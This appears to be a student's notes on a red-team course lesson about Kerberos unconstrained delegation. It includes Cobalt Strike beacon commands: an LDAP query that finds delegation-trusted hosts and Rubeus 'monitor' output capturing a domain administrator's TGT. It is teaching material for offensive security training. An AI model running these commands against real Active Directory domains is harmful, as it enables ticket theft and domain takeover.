
Kerberos "delegation" is a feature that allows one principal to request access to resources on behalf of another principal.  Imagine a scenario where users authenticate to a front-end web application using Kerberos, but that web application leverages another back-end service, such as a database or file share.  When a user performs an operation that needs to be processed on the back-end service, the web application needs a way to authenticate to that service as the user in question.

![[Pasted image 20250720224523.png]]

We know from the Kerberos introduction in [Credential Access](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=67851a86ba9789af1107f5f9) that the user authenticates to the domain controller and obtains a TGT, which it then uses to request service tickets.  But in this scenario, how could the web server go about obtaining an MSSQLSvc ticket for the user?  It can't ask the domain controller directly because it doesn't know the user's secret.  This is what delegation was designed for.

There are multiple types of delegation in modern Windows:

- Unconstrained Delegation.
    
- Constrained Delegation.
    
- Role-Based Constrained Delegation.
    

We will cover each in turn, but this lesson will focus on unconstrained.  This is the first type of delegation that was introduced and also turned out to be the most dangerous.  It's enabled by setting a flag called `TRUSTED_FOR_DELEGATION` on the UserAccountControl attribute of the computer object.

```powershell
beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname

sAMAccountName: CONT-DC-1$
sAMAccountName: CONT-WEB-1$
```

> Domain controllers are always configured with unconstrained delegation, but this isn't much of an issue since having local admin access to a domain controller is pretty much game over anyway.

When a client requests a service ticket for an SPN running under the context of this computer account (e.g. the HTTP service), the domain controller sets a flag in the TGS-REP called `ok-as-delegate`.  This tells the requesting client that the server specified in the ticket is trusted for delegation; so when it sends the AP-REQ to the service, it includes both the service ticket and a copy of the user's TGT.  The computer running the service will then be able to cache the user's TGT in memory, and use it to request service tickets on their behalf in the future.

You may be able to see why this type of delegation is so bad from a security perspective.  If an adversary can compromise a computer configured for unconstrained delegation, they can extract these TGTs from memory and use them to request service tickets on behalf of those users to any other service in the entire domain.

Rubeus has a `monitor` command that periodically captures and displays TGTs as users authenticate to a service.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap

[*] 19/02/2025 14:56:32 UTC - Found new TGT:

  User                  :  dyork@CONTOSO.COM
  StartTime             :  19/02/2025 14:56:16
  EndTime               :  20/02/2025 00:56:16
  RenewTill             :  26/02/2025 14:56:16
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFj[...snip...]kNPTQ==
```

This output shows that we have captured a TGT from a domain administrator, dyork.

To terminate Rubeus, use the `jobs` and `jobkill` commands.

```powershell
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 0    2468  .NET assembly

beacon> jobkill 0
[+] job 0 completed

```